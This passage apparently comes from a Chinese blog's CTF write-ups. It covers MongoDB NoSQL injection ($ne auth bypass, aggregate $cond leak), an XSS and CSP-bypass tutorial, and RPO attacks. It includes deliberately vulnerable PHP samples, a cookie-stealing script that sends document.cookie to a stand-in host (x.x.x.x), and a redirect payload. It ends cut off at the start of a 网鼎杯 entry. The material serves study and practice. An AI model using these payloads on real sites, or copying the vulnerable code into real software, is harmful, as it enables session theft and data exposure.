[<span class="hljs-string">&#x27;$sum&#x27;</span> =&gt; <span class="hljs-number">1</span>]]],<br>            [<span class="hljs-string">&#x27;$sort&#x27;</span> =&gt; [<span class="hljs-string">&#x27;count&#x27;</span> =&gt; -<span class="hljs-number">1</span>]],<br>            [<span class="hljs-string">&#x27;$limit&#x27;</span> =&gt; <span class="hljs-number">5</span>],<br>        ];<br>        <span class="hljs-variable">$filters</span> = [<br>            [<span class="hljs-string">&#x27;$project&#x27;</span> =&gt; [<span class="hljs-string">&#x27;category&#x27;</span> =&gt; <span class="hljs-variable">$filter</span>]]<br>        ];<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;aggregate(array_merge(<span class="hljs-variable">$filters</span>, <span class="hljs-variable">$pipeline</span>));<br>    <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filter</span>)): <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$category</span>) &#123;<br>                    printf(<span class="hljs-string">&quot;%s has %d news&lt;br&gt;&quot;</span>, <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;_id&#x27;</span>], <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;count&#x27;</span>]);<br>            &#125;<br>        <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">else</span>: <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])): <span class="hljs-meta">?&gt;</span><br>        Invalid username <span class="hljs-keyword">or</span> password<br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br>    &lt;form action=<span class="hljs-string">&#x27;/&#x27;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>    &lt;h2&gt;News&lt;/h2&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;find([<span class="hljs-string">&#x27;public&#x27;</span> =&gt; <span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$news</span>) &#123;<br>            printf(<span class="hljs-string">&quot;%s&lt;br&gt;&quot;</span>, <span class="hljs-variable">$news</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>这里第一步永真绕过,payload为。文章中用得<code>&quot;$ne&quot;=null</code>但我本地不对可能是php版本得问题</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/mongo/test_mongo.php?username=1&amp;password=&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;, &quot;username&quot;:&quot;admin</span><br></code></pre></div></td></tr></table></figure><p>输出为</p><p><img src="https://img-blog.csdnimg.cn/372db5c3313c40c8a192b4228294f7e3.png" alt="在这里插入图片描述"></p><p>第二步漏洞在<code>aggregate</code>方法</p><p>filter 参数里可以填 <code>category</code>展示目录 <code>text</code>展示内容 <code>title</code>展示标题，但是都限制了5条。</p><p>代码里是用的 MongoDB 聚合函数<code>aggregate</code>，下面这张图也是来自官方文档，解释了<code>aggregate</code>函数的执行过程：</p><p><img src="https://img-blog.csdnimg.cn/0683249c7df14e87ae36aacadd54991d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>使用<code>aggregate</code>聚合函数时，在里面是可以使用条件判断语句的。在 MongoDB 中<code>$cond</code>表示if判断语句，匹配的符号使用<code>$eq</code>，连起来为<code>[$cond][if][$eq]</code>，当使用多个判断条件时重复该语句即可。</p><p>官方文档列出的<code>$cond</code>的用法： $project可以指定输出需要查询字段</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">db.inventory.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             item: 1,<br>             discount:<br>               &#123;<br>                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure><p>现在我们的目的是：如果<code>$category</code>的值是 flag，那么就输出<code>$title</code>的内容，否则还是原样输出<code>$catagory</code>，照着上面的例子写成 MongoDB shell 的形式就是</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.news.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             category:<br>               &#123;<br>                 $cond: &#123; <span class="hljs-attr">if</span>: &#123; <span class="hljs-attr">$eq</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ] &#125;, <span class="hljs-attr">then</span>: $title, <span class="hljs-attr">else</span>: $category &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure><p>转换成 PHP 数组形式传入 filter 参数：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=flags&amp;filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][<span class="hljs-keyword">else</span>]=$category<br></code></pre></div></td></tr></table></figure><p>转换成<code>raw_query</code>的形式：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;category&quot;</span>:<br>    &#123;<br>     <span class="hljs-string">&quot;$cond&quot;</span>:<br>     &#123;<br>      <span class="hljs-string">&quot;if&quot;</span>:<br>      &#123;<br>          <span class="hljs-string">&quot;$eq&quot;</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ]<br>      &#125;,<br>      <span class="hljs-string">&quot;then&quot;</span>: <span class="hljs-string">&quot;$title&quot;</span>,<br>      <span class="hljs-string">&quot;else&quot;</span>: <span class="hljs-string">&quot;$category&quot;</span><br>     &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>var_dump(json_decode(raw_query))</code>即为：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">object(stdClass)#4 (1) &#123;<br>  [<span class="hljs-string">&quot;category&quot;</span>]=&gt;<br>  object(stdClass)#3 (1) &#123;<br>    [<span class="hljs-string">&quot;$cond&quot;</span>]=&gt;<br>    object(stdClass)#2 (3) &#123;<br>      [<span class="hljs-string">&quot;if&quot;</span>]=&gt;<br>      object(stdClass)#1 (1) &#123;<br>        [<span class="hljs-string">&quot;$eq&quot;</span>]=&gt;<br>        <span class="hljs-function"><span class="hljs-title">array</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>)</span> &#123;<br>          [<span class="hljs-number">0</span>]=&gt;<br>          string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>          [<span class="hljs-number">1</span>]=&gt;<br>          string(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;flags&quot;</span><br>        &#125;<br>      &#125;<br>      [<span class="hljs-string">&quot;then&quot;</span>]=&gt;<br>      string(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;$title&quot;</span><br>      [<span class="hljs-string">&quot;else&quot;</span>]=&gt;<br>      string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>参考</p><p><a href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1602092">https://cloud.tencent.com/developer/article/1602092</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2021/09/16/2021-10-xss(1)/"/>
    <url>/2021/09/16/2021-10-xss(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于xss得了解和熟悉感觉还是很少得，这次集中学习一下。</p><p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的</p><p>一个简单的 XSS 漏洞页面，没有对用户的输入进行过滤，就像这样：</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&lt;form&gt;<br>    &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&lt;?php echo $_GET[&quot;name&quot;]; ?&gt;&quot; /&gt;<br>    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;<br>&lt;/form&gt;<br></code></pre></div></td></tr></table></figure><p>对于这样毫无过滤的页面，我们可以轻而易举的进行 XSS。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&quot;/&gt; &lt;script&gt;alert(0)&lt;/script&gt; &lt;!--<br></code></pre></div></td></tr></table></figure><p>但其实这种漏洞通常可以用<code>htmlspecialchars</code> 函数来过滤输入。</p><p><code>htmlspecialchars</code> 函数：将特殊字符转换为 HTML 实体。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&amp; (AND) =&gt; &amp;amp;<br>&quot; (双引号) =&gt; &amp;quot;<br>&#x27; (单引号) =&gt; &amp;#039;<br>&lt; (小于号) =&gt; &amp;lt; <br>&gt; (大于号) =&gt; &amp;gt;<br></code></pre></div></td></tr></table></figure><p>但是仅仅这样防御使不够的，还有各种输入手法，这里简单了解一下<code>CSP</code>防御机制，其实就是从浏览器层面来防御，而不是从代码中。</p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>CSP 的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p><h3 id="csp结构"><a href="#csp结构" class="headerlink" title="csp结构"></a>csp结构</h3><p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;<br>style-src cdn.example.org third-party.org; child-src https:<br></code></pre></div></td></tr></table></figure><p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.o</span></span><br></code></pre></div></td></tr></table></figure><p>其中每一组策略包含一个策略指令和一个内容源列表。简单的说一下一些策略指令</p><p><strong>default-src</strong></p><p>default-src 作为所有其他指令的备用，一般来说 default-src ‘none’; script-src ‘self’ 这样的情况就会是 script-src 遵循 self，其他的都会使用 none。也就是说，除了被设置的指令以外，其余指令都会被设置为 default-src 指令所设置的属性。</p><p>对于这个属性有个特殊的配置叫 unsafe-eval，它会允许下面几个函数：</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">eval() Function() setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.<br></code></pre></div></td></tr></table></figure><p><strong>关键字</strong></p><p><strong>‘none’</strong></p><p>代表空集；即不匹配任何 URL。</p><p><strong>‘self’</strong></p><p>代表和文档同源，包括相同的 URL 协议和端口号。也就是常说的同源策略。</p><p><strong>‘unsafe-inline’</strong></p><p>允许使用内联资源，如内联的 script 元素、javascript: URL、内联的事件处理函数和内联的 style 元素。</p><p><strong>‘unsafe-eval’</strong></p><p>允许使用 eval() 等通过字符串创建代码的方法。</p><p><strong>数据</strong></p><p><strong>data:</strong></p><p>允许 data: URI 作为内容来源。这是不安全的，因为攻击者可以精心构造 data: URI 来攻击。请谨慎地使用这个源，并确保不要用于脚本。</p><p><strong>mediastream:</strong></p><p>允许 mediastream: URI 作为内容来源。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream:<br></code></pre></div></td></tr></table></figure><h3 id="csp的一些绕过"><a href="#csp的一些绕过" class="headerlink" title="csp的一些绕过"></a>csp的一些绕过</h3><p><strong>meta网页跳转绕过</strong></p><p>这个情况的话，可以利用 meta 标签实现网页跳转：</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">127.0.0.1/csp/?twosecurity=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://x.x.x.x/&quot; &gt;<br></code></pre></div></td></tr></table></figure><p><strong>location绕过</strong></p><p>有的情况 csp 会使用 script-src ‘unsafe-inline’; 这个地方可以直接用location.href(window.location/window.open) 绕过</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">127.0.0.1/csp/?twosecurity=&lt;script&gt;location.href=&#x27;http://x.x.x.x/cookie/&#x27;%2bescape(document.cookie);&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p><strong>站点可控静态资源绕过</strong></p><p>给一个绕过 codimd 的 codimd xss</p><p>例子中 codimd 的 CSP 中使用了 google-analytics，而 analytics 中提供了自定义 javascript 的功能（google会封装自定义的js，所以还需要 unsafe-eval），于是可以绕过 CSP。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;<br>&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>还有很多绕过，参考：<a href="https://lorexxar.cn/2017/10/25/csp-paper/#1%E3%80%82">https://lorexxar.cn/2017/10/25/csp-paper/#1。</a></p><h1 id="ctf例题"><a href="#ctf例题" class="headerlink" title="ctf例题"></a>ctf例题</h1><h2 id="一道XSS题目分析"><a href="#一道XSS题目分析" class="headerlink" title="一道XSS题目分析"></a>一道XSS题目分析</h2><p>题目地址：<a href="https://challenge.intigriti.io/%E3%80%82%E8%83%BD%E8%AE%BF%E9%97%AE%E4%BD%86%E7%8E%AF%E5%A2%83%E5%A5%BD%E5%83%8F%E6%B2%A1%E4%BA%86">https://challenge.intigriti.io/。能访问但环境好像没了</a></p><p>参考题解吧：<a href="https://www.secpulse.com/archives/128882.html">https://www.secpulse.com/archives/128882.html</a></p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> hash = <span class="hljs-built_in">document</span>.location.hash.substr(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (hash) &#123;<br>    displayReason(hash);<br>&#125;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;reasons&quot;</span>).onchange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (e.target.value != <span class="hljs-string">&quot;&quot;</span>)<br>        displayReason(e.target.value);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reasonLoaded</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> reason = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;reason&quot;</span>);<br>    reason.innerHTML = <span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">this</span>.responseText);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayReason</span>(<span class="hljs-params">reason</span>) </span>&#123;<br>    <span class="hljs-built_in">window</span>.location.hash = reason;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>    xhr.addEventListener(<span class="hljs-string">&quot;load&quot;</span>, reasonLoaded);<br>    xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">`./reasons/<span class="hljs-subst">$&#123;reason&#125;</span>.txt`</span>);<br>    xhr.send();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>总结一下：</p><p>了解<code>inerHTML</code>触发<code>DOMxss</code>漏洞</p><p>寻找content injection</p><p>寻找站内可控的content，通过<code>iframe</code>的<code>srcdoc</code>属性可以绕过<code>innerHTML</code>不解析<code>&lt;script&gt;</code>的限制</p><p>构造payload注入</p><h2 id="34C3CTF-urlstorage"><a href="#34C3CTF-urlstorage" class="headerlink" title="34C3CTF urlstorage"></a>34C3CTF urlstorage</h2><p><a href="https://lorexxar.cn/2018/01/02/34c3-writeup/#CSS-RPO">https://lorexxar.cn/2018/01/02/34c3-writeup/#CSS-RPO</a></p><p><a href="http://www.thespanner.co.uk/2014/03/21/rpo/">http://www.thespanner.co.uk/2014/03/21/rpo/</a></p><p><a href="http://blog.nsfocus.net/rpo-attack/">http://blog.nsfocus.net/rpo-attack/</a></p><p>考点为<code>rpo</code>+<code>csrf</code>+<code>xss</code></p><h3 id="nginx和apache2的差异化"><a href="#nginx和apache2的差异化" class="headerlink" title="nginx和apache2的差异化"></a>nginx和apache2的差异化</h3><p>首先了解一下nginx和apache2对于url地址解析的不同</p><p>nginx对于%2f是能够解析成/的但是apache2不行</p><p><img src="https://img-blog.csdnimg.cn/034c2f2f20c34345947590dd8cb2ec73.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>第二个差异化在于</p><p>在Nginx中，编码后的url服务器可以正常识别，也就是说服务器在加载文件时会解码后找到具体文件返回返回客户端。</p><p>但是在客户端识别url时是不会解码的，正常情况下解码%2f解码后应该加载的是<code>rpo/xxx/../x.js</code>，最后也就是rpo/x.js文件；而这里加载的是/x.js，所以浏览器是没有解码%2f的。</p><p>当url为<code>/rpo/%2f../1.php</code>时最终访问的是<code>/1.php</code></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211005115258272.png" alt="image-20211005115258272"></p><p>这里其实是客户端浏览器在加载相对路径文件时是以最后一个/为相对目录加载具体资源文件的。</p><h3 id="简单实例："><a href="#简单实例：" class="headerlink" title="简单实例："></a>简单实例：</h3><h4 id="一：加载静态文件"><a href="#一：加载静态文件" class="headerlink" title="一：加载静态文件"></a>一：加载静态文件</h4><p>现在有一个php路由<code>/rpo/111/1.php</code>源码里面通过<code>&lt;script src=&quot;../x.js&quot;&gt;&lt;/script&gt;</code>用相对目录加载了静态文件，这时如果我们可以控制另外的一个在别的目录下<code>x.js</code>的内容，再让<code>x.js</code>加载到<code>1.php</code>下便可执行恶意代码。</p><p>正常访问下，这里可以随便在111目录下创建个x.js文件。</p><p><img src="https://img-blog.csdnimg.cn/25c3902c99994e1a93d2dd4259e67f09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>构造这样一个路由<code>/rpo/222/test.php%2f..%2f..%2f111/1.php</code>便可执行<code>x.js</code>内容。</p><p><img src="https://img-blog.csdnimg.cn/ab9a9b65a09e4ac5bbad4fed5c790b19.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>加载其他的静态文件也是一样的原理。</p><h4 id="二：将返回内容按静态文件解析"><a href="#二：将返回内容按静态文件解析" class="headerlink" title="二：将返回内容按静态文件解析"></a>二：<strong>将返回内容按静态文件解析</strong></h4><p>这个懒得做一遍了，简单描述一下就是，在某些场景下类似于在很多使用了<code>url_rewrite</code>的php开发框架以及python web框架中，经常使用相对路径来加载静态资源文件，而且url都有一个特征：</p><p>比如<code>/rpo/user/id/1</code>，这里表示使用参数为<code>id</code>，值为1的内容访问<code>user</code>接口；</p><p>比如<code>/rpo/user.php/name/tester</code>，这里表示使用参数<code>name</code>，内容为tester的内容访问<code>user.php</code>文件等。</p><p>例如这里如果仍然存在一个路由<code>/rpo/user</code>通过相对目录静态加载了<code>style.css</code>和<code>style.js</code>文件。</p><p>在<code>/rpo/user</code>界面我们可以提交内容，然后内容会显示到当前页面，而且使用相对路径加载静态文件style.css和script.js文件，这两个文件原本内容为空，此时我们访问：</p><p>当你访问<code>/rpo/user</code>时加载的是<code>/rpo/user/style.css和/rpo/user/style.js</code>。</p><p>当你用<code>/user/2</code>这里表示使用2作为参数请求user接口，此时加载静态文件和上述相同。</p><p>然后我们提交一段css内容：<code>&#123;&#125; * &#123;color:red;&#125;</code></p><p>当我们访问：<code>/rpo/user/2/xxx</code>时：</p><p><code>&#123;&#125; * &#123;color:red;&#125;</code>这段内容会被当成css解析。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/9-1.png" alt="img"></p><p>这里表示我们使用2/xxx作为参数访问user接口，返回的内容和使用参数2访问返回的内容相同。</p><p>但是浏览器客户端认为2是目录，然后加载的静态文件为:</p><p><code>/user/2/style.css</code></p><p>这里就用到了上面说到的特点，这里的意思是用参数为2，内容为<code>style.css</code>的内容访问user，这里可以发现时加载静态文件返回的内容也是同使用参数2访问时返回内容相同，但是浏览器将会认为这里加载的是样式文件和脚本文件，从而将返回内容解析为css或者js，所以我们提交的css内容：<code>&#123;&#125; * &#123;color:red;&#125; </code>成功解析为css，将页面渲染成红色。</p><p>这里还有个关键就是CSS在加载的时候与JS一样是逐行解析的，不同的是CSS会忽略页面中不符合CSS语法的行。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><a href="https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/">https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/</a></p><p><a href="https://www.secpulse.com/archives/128882.html">https://www.secpulse.com/archives/128882.html</a></p>]]></content>
    
    
    <categories>
      
      <category>xss</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯做题记录</title>
    <link href="/2021/09/01/2021-9-1-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/"/>
    <url>/2021/09/01/2021-9-1-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>题目直接给了源码，</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 